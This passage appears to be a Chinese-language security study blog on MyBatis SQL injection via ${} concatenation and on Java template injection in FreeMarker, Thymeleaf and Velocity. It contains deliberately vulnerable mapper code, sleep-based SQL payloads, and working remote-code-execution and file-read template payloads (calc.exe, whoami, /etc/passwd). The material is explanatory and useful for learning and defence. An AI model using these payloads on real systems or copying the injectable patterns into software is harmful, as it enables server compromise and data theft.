</span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.username = username;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getPassword</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> password;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setPassword</span><span class="params">(String password)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.password = password;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;User [id=&quot;</span> + id + <span class="string">&quot;, username=&quot;</span> + username + <span class="string">&quot;, password=&quot;</span> + password + <span class="string">&quot;]&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>UserMapper.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.sqlidemo.mybatisinjection;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.annotations.Mapper;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.annotations.Param;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.annotations.Select;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 编号7089</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Mapper</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">UserMapper</span> </span>&#123;</span><br><span class="line">    <span class="function">List&lt;User&gt; <span class="title">orderbyInjection</span><span class="params">(<span class="meta">@RequestParam(&quot;sort&quot;)</span> String sort)</span></span>;</span><br><span class="line">    <span class="meta">@Select(&quot;select * from users where id in ($&#123;params&#125;)&quot;)</span></span><br><span class="line">    <span class="function">List&lt;User&gt; <span class="title">inInjection</span><span class="params">(<span class="meta">@Param(&quot;params&quot;)</span>String params)</span></span>;</span><br><span class="line">    <span class="function">List&lt;User&gt; <span class="title">likeInjection</span><span class="params">(<span class="meta">@Param(&quot;username&quot;)</span> String username)</span></span>;</span><br><span class="line"><span class="comment">//Mybatis查询SQL语句的另一种使用注解方式，这也是存在SQL注入的。</span></span><br><span class="line"><span class="comment">//@Select(&quot;select * from users where username = &#x27;$&#123;username&#125;&#x27;&quot;)</span></span><br><span class="line"><span class="comment">//List&lt;User&gt; likeInjection(@Param(&quot;username&quot;) String username);</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>UserMapper.xml</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">mapper</span> <span class="meta-keyword">PUBLIC</span> <span class="meta-string">&quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;</span> <span class="meta-string">&quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mapper</span> <span class="attr">namespace</span>=<span class="string">&quot;com.example.sqlidemo.mybatisinjection.UserMapper&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">resultMap</span> <span class="attr">type</span>=<span class="string">&quot;com.example.sqlidemo.mybatisinjection.User&quot;</span> <span class="attr">id</span>=<span class="string">&quot;User&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">id</span> <span class="attr">column</span>=<span class="string">&quot;id&quot;</span> <span class="attr">property</span>=<span class="string">&quot;id&quot;</span> <span class="attr">javaType</span>=<span class="string">&quot;java.lang.Integer&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">jdbcType</span>=<span class="string">&quot;NUMERIC&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">id</span> <span class="attr">column</span>=<span class="string">&quot;username&quot;</span> <span class="attr">property</span>=<span class="string">&quot;username&quot;</span> <span class="attr">javaType</span>=<span class="string">&quot;java.lang.String&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">jdbcType</span>=<span class="string">&quot;VARCHAR&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">id</span> <span class="attr">column</span>=<span class="string">&quot;password&quot;</span> <span class="attr">property</span>=<span class="string">&quot;password&quot;</span> <span class="attr">javaType</span>=<span class="string">&quot;java.lang.String&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">jdbcType</span>=<span class="string">&quot;VARCHAR&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">resultMap</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;orderbyInjection&quot;</span> <span class="attr">parameterType</span>=<span class="string">&quot;String&quot;</span> <span class="attr">resultMap</span>=<span class="string">&quot;User&quot;</span>&gt;</span></span><br><span class="line">        select * from users order by $&#123;sort&#125; asc</span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;likeInjection&quot;</span> <span class="attr">parameterType</span>=<span class="string">&quot;String&quot;</span> <span class="attr">resultMap</span>=<span class="string">&quot;User&quot;</span>&gt;</span></span><br><span class="line">        select * from users where username like &#x27;%$&#123;username&#125;%&#x27;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mapper</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h3 id="order-by-1"><a href="#order-by-1" class="headerlink" title="order by"></a>order by</h3><p>oder by的mybatis代码如下：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;orderbyInjection&quot;</span> <span class="attr">parameterType</span>=<span class="string">&quot;String&quot;</span> <span class="attr">resultMap</span>=<span class="string">&quot;User&quot;</span>&gt;</span></span><br><span class="line">    select * from users order by $&#123;sort&#125; asc</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以很明显的看到使用 <strong>${}</strong> 拼接，所以这种在mybatis层是没有作任何过滤的，和字符串拼接一样的。</p>
<p><img src="image-20230817152659383.png" alt="image-20230817152659383"></p>
<h3 id="in"><a href="#in" class="headerlink" title="in"></a>in</h3><p>in的相关sql如下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Select(&quot;select * from users where id in ($&#123;params&#125;)&quot;)</span></span><br><span class="line"><span class="function">List&lt;User&gt; <span class="title">inInjection</span><span class="params">(<span class="meta">@Param(&quot;params&quot;)</span>String params)</span></span>;</span><br></pre></td></tr></table></figure>

<p>可以看到也是 <strong>${}</strong> 拼接的sql语句</p>
<p>拼接后的语句：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="keyword">in</span> (<span class="number">1</span>,(<span class="keyword">select</span> sleep(<span class="number">3</span>)))</span><br></pre></td></tr></table></figure>

<img src="image-20230817154744114.png" alt="image-20230817154744114" style="zoom:80%;">



<p>但是这里有个问题，可以对比几个不同的payload来说明一下问题</p>
<img src="image-20230817155004492.png" alt="image-20230817155004492" style="zoom:80%;">
<img src="image-20230817155042098.png" alt="image-20230817155042098" style="zoom:80%;">
<img src="image-20230817155511529.png" alt="image-20230817155511529" style="zoom:80%;">

<p>三个不同的payload：</p>
<ul>
<li>(select sleep(3))</li>
<li>1,(select sleep(3))</li>
<li>1,2,(select sleep(3))</li>
</ul>
<p>返回时间分别约为6s、3s、0s</p>
<p>经过一波测试，初步猜测in的实际工作原理，是从括号里，把元素从左到右拿出来，使用id=xxxx进行对比，所以图2这条sql：select * from users where id in ((select sleep(1))); 花的时间是5秒，也就是执行了5次id=(select sleep(1))。</p>
<p>如果查到一条就把他从待查询目标中划掉，后续的带查询目标就少了一条，比如图3的第一条sql：select * from users where id in (1,2,(select sleep(1)));  查到了两次，1和2,待查询目标只剩5-2=3条了，所以这条sql花了3秒，而如果前面把所有的都查完了，比如图3的第三条sql：select * from users where id in (1,2,3,4,5,(select sleep(1)));前面把5条都查到了，带查询目标为5-5=0条，所以这条sql花了0秒。</p>
<p><img src="image-20230817162818301.png" alt="image-20230817162818301"></p>
<p><img src="image-20230817163536750.png" alt="image-20230817163536750"></p>
<p><img src="image-20230817162834634.png" alt="image-20230817162834634"></p>
<p><img src="image-20230817164543541.png" alt="image-20230817164543541"></p>
<p><img src="image-20230817165031917.png" alt="image-20230817165031917"></p>
<p>not in 应该也是一样的</p>
<h3 id="like"><a href="#like" class="headerlink" title="like"></a>like</h3><p>like和order by一样，</p>
<p><img src="image-20230817170536471.png" alt="image-20230817170536471"></p>
<p>正确写法应该是：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE name like CONCAT(&quot;%&quot;, #&#123;name&#125;, &quot;%&quot;)</span><br></pre></td></tr></table></figure>



<h1 id="Java-模板引擎与漏洞-SSTI"><a href="#Java-模板引擎与漏洞-SSTI" class="headerlink" title="Java 模板引擎与漏洞 SSTI"></a>Java 模板引擎与漏洞 SSTI</h1><p>目前 Java 常见的模板引擎 FreeMarker，Velocity 和 Thymeleaf。<br>模板引擎，其实就是一个根据模板和数据输出结果的一个工具，目的是为了让显示与数据分离。</p>
<p>我们都了解 JSP，其实 JSP 也是一种模板引擎，通过后端向前端插入数据而实现动态网页的效果。</p>
<p>在 JSP 之前，使用 servlet 来实现动态网页效果，将数据返回到前端生成 HTML 页面时，异常的繁琐，需要使用 out.write() 一行行的输出，比如：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">out.write(<span class="string">&quot;&lt;html&gt;\n&quot;</span>)</span><br><span class="line">out.write(<span class="string">&quot;&lt;head&gt;&quot;</span>\n)</span><br><span class="line">out.write(<span class="string">&quot;&lt;h1&gt;hello servlet&lt;/h1&gt;\n&quot;</span>)</span><br><span class="line">out.write(<span class="string">&quot;&lt;/head&gt;\n&quot;</span>)</span><br><span class="line">out.write(<span class="string">&quot;&lt;/html&gt;\n&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>虽然 JSP 也是模板引擎的一种，但是由于其本质就是 servlet，可以直接无阻碍的访问底层的 servletAPI，也可以编写后端代码逻辑，导致前端和后端纠缠在一起，违背了面向对象低耦合，高内聚的核心思想，维护起来也越来越繁琐。因此经过演变，以及优秀的模板引擎接连不断地出现，JSP也逐渐被替代。这其中就包括 FreeMarker，Velocity 和 Thymeleaf等等。<br>（JSP 为什么被淘汰了？<a class="link" target="_blank" rel="noopener" href="https://www.zhihu.com/question/328713931%EF%BC%89">https://www.zhihu.com/question/328713931）<i class="fas fa-external-link-alt"></i></a><br>言归正传，使用大白话简单解释下模板引擎。<br>比如：前端做好一个模板页面，是人员信息展示页面，在姓名，性别，年龄处，使用模板引擎特定的”变量符/指令/插值“进行占位，后端查询回来的数据可以动态的向这些占位处填充实际数据。</p>
<h2 id="模板注入漏洞"><a href="#模板注入漏洞" class="headerlink" title="模板注入漏洞"></a>模板注入漏洞</h2><p>SSTI （Server-Side Template Injection，服务器端模板注入），广泛来说是在模板引擎解析模板时，可能因为代码实现不严谨，存在将恶意代码注入到模板的漏洞。这种漏洞可以被攻击者利用来在服务器端执行任意代码，造成严重的安全威胁。<br>简单说，在模板引擎渲染模板时，如果模板中存在恶意代码，进而会在渲染时执行恶意代码。不同的模板触发漏洞的场景也不同，下面我们将针对 FreeMarker，Velocity 和 Thymeleaf 这三款模板引擎进行详细讲解。<br>因此，模板注入漏洞是基于模板引擎而存在的。如果项目中引入相关模板引擎组件，才有可能存在模板注入漏洞</p>
<h2 id="Freemarker-总体结构"><a href="#Freemarker-总体结构" class="headerlink" title="Freemarker 总体结构"></a>Freemarker 总体结构</h2><p>模板(FTL编程)是由如下部分混合而成的：</p>
<ul>
<li>文本：文本会照着原样来输出。</li>
<li>插值：这部分的输出会被计算的值来替换。插值由 ${ and } 所分隔(或者 #{ and } ，这种风格已经不建议再使用了；点击查看更多（<a class="link" target="_blank" rel="noopener" href="http://freemarker.foofun.cn/ref_depr_numerical_interpolation.html%EF%BC%89)%E3%80%82">http://freemarker.foofun.cn/ref_depr_numerical_interpolation.html）)。<i class="fas fa-external-link-alt"></i></a></li>
<li>FTL 标签：FTL标签和HTML标签很相似，但是它们却是给FreeMarker的指示， 而且不会打印在输出内容中。</li>
<li>注释：注释和HTML的注释也很相似，但它们是由 &lt;#– 和 –&gt; 来分隔的。注释会被FreeMarker直接忽略， 更不会在输出内</li>
</ul>
<p><img src="image-20230831100244686.png" alt="image-20230831100244686"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;[BR]</span><br><span class="line">&lt;head&gt;[BR]</span><br><span class="line">  &lt;title&gt;Welcome!&lt;&#x2F;title&gt;[BR]</span><br><span class="line">&lt;&#x2F;head&gt;[BR]</span><br><span class="line">&lt;body&gt;[BR]</span><br><span class="line">  &lt;#-- Greet the user with his&#x2F;her name --&gt;[BR]</span><br><span class="line">  &lt;h1&gt;Welcome $&#123;user&#125;!&lt;&#x2F;h1&gt;[BR]</span><br><span class="line">  &lt;p&gt;We have these animals:[BR]</span><br><span class="line">  &lt;ul&gt;[BR]</span><br><span class="line">  &lt;#list animals as animal&gt;[BR]</span><br><span class="line">    &lt;li&gt;$&#123;animal.name&#125; for $&#123;animal.price&#125; Euros[BR]</span><br><span class="line">  &lt;&#x2F;#list&gt;[BR]</span><br><span class="line">  &lt;&#x2F;ul&gt;[BR]</span><br><span class="line">&lt;&#x2F;body&gt;[BR]</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<h2 id="插值"><a href="#插值" class="headerlink" title="插值"></a>插值</h2><p>插值的使用格式是： ${<em>expression</em>} ，这里的 expression 可以是所有种类的表达式(比如 ${100+x} )。</p>
<p>插值是用来给 表达式 插入具体值然后转换为文本(字符串)。插值仅仅可以在两种位置使用：在文本区(比如 </p><h1>Hello ${name}!</h1> ) 和 字符串表达式 (比如 &lt;#include “/footer/${company}.html”&gt; )<p></p>
<h2 id="内建函数"><a href="#内建函数" class="headerlink" title="内建函数"></a>内建函数</h2><p>Freemarker 自带大量的内建函数。具体可看：<a class="link" target="_blank" rel="noopener" href="http://freemarker.foofun.cn/ref_builtins.html">http://freemarker.foofun.cn/ref_builtins.html<i class="fas fa-external-link-alt"></i></a><br>在这些大量的内建函数里面，我们主要关注两个，分别为： api 和 new </p>
<ul>
<li>3.1、api 内建函数<br>如果value本身支持这个额外的特性， *value*?api 提供访问 *value* 的API (通常是 Java API)，比如*value*?api.*someJavaMethod()* ， 当需要调用对象的Java方法时，这种方式很少使用， 但是FreeMarker 揭示的value的简化视图的模板隐藏了它，也没有相等的内建函数。 例如，当有一个Map ，并放入数据模型 (使用默认的对象包装器)，模板中的 myMap.myMethod() 基本上翻译成Java的((Method) myMap.get(“myMethod”)).invoke(…) ，因此不能调用 myMethod 。如果编写了myMap?api.myMethod() 来代替，那么就是Java中的 myMap.myMethod() 。<ul>
<li>对于 api 函数必须在配置项 api_builtin_enabled 为 true 时才有效，而该配置在 2.3.22 版本之后<br>默认为 false</li>
</ul>
</li>
<li>3.2、new 内建函数<br>这是用来创建一个确定的 TemplateModel 实现变量的内建函数。在 ? 的左边你可以指定一个字符串， 是 TemplateModel 实现类的完全限定名。 结果是调用构造方法生成一个方法变量，然后将新变量返回。<br>比如：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;#-- Creates an user-defined directive be calling the parameterless</span><br><span class="line">constructor of the class --&gt;</span><br><span class="line">&lt;#assign word_wrapp &#x3D; &quot;com.acmee.freemarker.WordWrapperDirective&quot;?new()&gt;</span><br><span class="line">&lt;#-- Creates an user-defined directive be calling the constructor with one</span><br><span class="line">numerical argument --&gt;</span><br><span class="line">&lt;#assign word_wrapp_narrow &#x3D; &quot;com.acmee.freemarker.WordWrapperDirective&quot;?</span><br><span class="line">new(40)&gt;</span><br></pre></td></tr></table></figure>

<p>对于 Freemarker 模板注入漏洞的攻击，我们着重将视角放在<strong>上传模板，修改模板</strong>等功能。比如修改模板功能，我们只需在修改的模板中嵌入攻击 Payload 即可成功。<br>（当然了以上说法仅是在无任何防护的理想情况下，实际中可能会遇见各种问题。）</p>
<p>这块看pdf没怎么看懂，</p>
<h2 id="PayLoad"><a href="#PayLoad" class="headerlink" title="PayLoad"></a>PayLoad</h2><h3 id="new"><a href="#new" class="headerlink" title="new"></a>new</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;#assign value&#x3D;&quot;freemarker.template.utility.Execute&quot;?new()&gt;$&#123;value(&quot;calc.exe&quot;)&#125;</span><br><span class="line"></span><br><span class="line">&lt;#assign value&#x3D;&quot;freemarker.template.utility.ObjectConstructor&quot;?new()&gt;$&#123;value(&quot;java.lang.ProcessBuilder&quot;,&quot;calc.exe&quot;).start()&#125;</span><br><span class="line"></span><br><span class="line">&lt;#assign value&#x3D;&quot;freemarker.template.utility.JythonRuntime&quot;?new()&gt;&lt;@value&gt;import os;os.system(&quot;calc.exe&quot;)&lt;&#x2F;@value&gt;&#x2F;&#x2F;@value为自定义标签</span><br></pre></td></tr></table></figure>

<h3 id="api"><a href="#api" class="headerlink" title="api"></a>api</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">加载恶意类</span><br><span class="line">&lt;#assign classLoader&#x3D;object?api.class.getClassLoader()&gt;$&#123;classLoader.loadClass(&quot;Evil.class&quot;)&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">读取任意文件</span><br><span class="line">&lt;#assign uri&#x3D;object?api.class.getResource(&quot;&#x2F;&quot;).toURI()&gt; &lt;#assign input&#x3D;uri?api.create(&quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;).toURL().openConnection()&gt; &lt;#assign is&#x3D;input?api.getInputStream()&gt; FILE:[&lt;#list 0..999999999 as _&gt; &lt;#assignbyte&#x3D;is.read()&gt; &lt;#if byte &#x3D;&#x3D; -1&gt; &lt;#break&gt; &lt;&#x2F;#if&gt; $&#123;byte&#125;, &lt;&#x2F;#list&gt;]</span><br></pre></td></tr></table></figure>



<h2 id="Thymeleaf"><a href="#Thymeleaf" class="headerlink" title="Thymeleaf"></a>Thymeleaf</h2><p>Thymeleaf 表达式可以有以下类型：</p>
<ul>
<li><code>$&#123;...&#125;</code>：变量表达式 —— 通常在实际应用，一般是OGNL表达式或者是 Spring EL，如果集成了Spring的话，可以在上下文变量（context variables ）中执行</li>
<li><code>*&#123;...&#125;</code>: 选择表达式 —— 类似于变量表达式，区别在于选择表达式是在当前选择的对象而不是整个上下文变量映射上执行。</li>
<li><code>#&#123;...&#125;</code>: Message (i18n) 表达式 —— 允许从外部源（比如<code>.properties</code>文件）检索特定于语言环境的消息</li>
<li><code>@&#123;...&#125;</code>: 链接 (URL) 表达式 —— 一般用在应用程序中设置正确的 URL/路径（URL重写）。</li>
<li><code>~&#123;...&#125;</code>：片段表达式 —— <strong>Thymeleaf 3.x 版本新增的内容</strong>，分段段表达式是一种表示标记片段并将其移动到模板周围的简单方法。 正是由于这些表达式，片段可以被复制，或者作为参数传递给其他模板等等</li>
</ul>
<h3 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h3><p>举个例子：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/path&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">path</span><span class="params">(<span class="meta">@RequestParam</span> String lang)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;user/&quot;</span> + lang + <span class="string">&quot;/welcome&quot;</span>; <span class="comment">//template path is tainted</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这是 SpringBoot 项目中某个控制器的部分代码片段，thymeleaf 的目录如下：</p>
<p><img src="image-20230901165728679.png" alt="image-20230901165728679"></p>
<p>html文件如下：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">HTML</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span> <span class="attr">xmlns:th</span>=<span class="string">&quot;http://www.thymeleaf.org&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">th:fragment</span>=<span class="string">&quot;header&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h3</span>&gt;</span>Spring Boot Web Thymeleaf Example<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">th:fragment</span>=<span class="string">&quot;main&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span> <span class="attr">th:text</span>=<span class="string">&quot;&#x27;Hello, &#x27; + $&#123;message&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="image-20230901165933405.png" alt="image-20230901165933405"></p>
<p>从代码逻辑中基本上可以判断，这实际上是一个语言界面选择的功能，如果是中文阅读习惯者，那么会令<code>language</code>参数为<code>cn</code>，如果是英文阅读习惯者，那么会令<code>language</code>参数为<code>en</code>，代码逻辑本身实际上是没有什么问题的，但是这里采用的是 thymeleaf 模板，就出现了问题。</p>
<p>在springboot + thymeleaf 中，如果视图名可控，就会导致漏洞的产生。其主要原因就是在控制器中执行 return  后，Spring 会自动调度 Thymeleaf  引擎寻找并渲染模板，在寻找的过程中，会将传入的参数当成SpEL表达式执行，从而导致了远程代码执行漏洞。</p>
<ul>
<li>payload：（需要url编码否则会）</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:8090&#x2F;path?lang&#x3D;__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22whoami%22).getInputStream()).next()%7d__::.x</span><br></pre></td></tr></table></figure>

<p><img src="image-20230901165649682.png" alt="image-20230901165649682"></p>
<h2 id="Velocity"><a href="#Velocity" class="headerlink" title="Velocity"></a>Velocity</h2><p>VTL，Velocity Template Language</p>
<p>使用引用的方式将动态内容嵌入网站，变量是其中一种引用的类型，它可以引用 Java 代码中定义的内容，或者可以从网页中的 VTL 语句中获取其值。以下是一个可嵌入 HTML 文档中的 VTL 语句示例：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#set( $a &#x3D; &quot;Velocity&quot; )</span><br></pre></td></tr></table></figure>

<p>和所有 VTL 语句一样，以 # 字符开头并包含一个指令，比如上面的 set。上面的示例中，变量是 $a，值为 Velocity。这个变量，和所有引用一样，以 $ 字符开头。字符串值始终用引号括起来，可以是单引号或双引号。</p>
<ul>
<li>变量：使用 $ 符号来引用 ，$foo, $mud_Slinger1</li>
<li>方法：由一个$`字符开头的 VTL 标识符和VTL 方法体组成的引用，$customer.getAddress(), $person.setAttributes( [“Strange”, “Weird”, “Excited”] )</li>
<li>set 指令：set 指令用于设置引用的值，#set( $primate = “monkey” ), #set( $customer.Behavior = $primate )</li>
</ul>
<p>set的右侧可以是：变量引用、 字符串字面量、 属性引用、 方法引用、 数字字面量、 ArrayList Map</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#set( $monkey &#x3D; $bill ) ## variable reference</span><br><span class="line">#set( $monkey.Friend &#x3D; &quot;monica&quot; ) ## string literal</span><br><span class="line">#set( $monkey.Blame &#x3D; $whitehouse.Leak ) ## property reference</span><br><span class="line">#set( $monkey.Plan &#x3D; $spindoctor.weave($web) ) ## method reference</span><br><span class="line">#set( $monkey.Number &#x3D; 123 ) ##number literal</span><br><span class="line">#set( $monkey.Say &#x3D; [&quot;Not&quot;, $my, &quot;fault&quot;] ) ## ArrayList</span><br><span class="line">#set( $monkey.Map &#x3D; &#123;&quot;banana&quot; : &quot;good&quot;, &quot;roast beef&quot; : &quot;bad&quot;&#125;) ## Map</span><br></pre></td></tr></table></figure>





<h3 id="set-指令攻击语句示例"><a href="#set-指令攻击语句示例" class="headerlink" title="set 指令攻击语句示例"></a>set 指令攻击语句示例</h3><ul>
<li><p>#set($e=”e”);$e.getClass().forName(“java.lang.Runtime”).getMethod(“getRuntime”,null).invoke(null,null).exec(“calc”)</p>
</li>
<li><p>```vtl<br>#set($x=’’)##<br>#set($rt = $x.class.forName(‘java.lang.Runtime’))##<br>#set($chr = $x.class.forName(‘java.lang.Character’))##<br>#set($str = $x.class.forName(‘java.lang.String’))##<br>#set($ex=$rt.getRuntime().exec(‘id’))##<br>$ex.waitFor()<br>#set($out=$ex.getInputStream())##<br>#foreach( $i in[1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">+ &#96;&#96;&#96;java</span><br><span class="line">  #set($e&#x3D;&quot;exp&quot;)</span><br><span class="line">  #set($a&#x3D;$e.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;,null).invoke(null,null).exec($cmd))</span><br><span class="line">  #set($input&#x3D;$e.getClass().forName(&quot;java.lang.Process&quot;).getMethod(&quot;getInputStream&quot;).invoke($a))</span><br><span class="line">  #set($sc &#x3D; $e.getClass().forName(&quot;java.util.Scanner&quot;))</span><br><span class="line">  #set($constructor &#x3D;</span><br><span class="line">  $sc.getDeclaredConstructor($e.getClass().forName(&quot;java.io.InputStream&quot;)))</span><br><span class="line">  #set($scan&#x3D;$constructor.newInstance($input).useDelimiter(&quot;\A&quot;))</span><br><span class="line">  #if($scan.hasNext())</span><br><span class="line">  $scan.next()</span><br><span class="line">  #end</span><br></pre></td></tr></table></figure></li>
</ul>
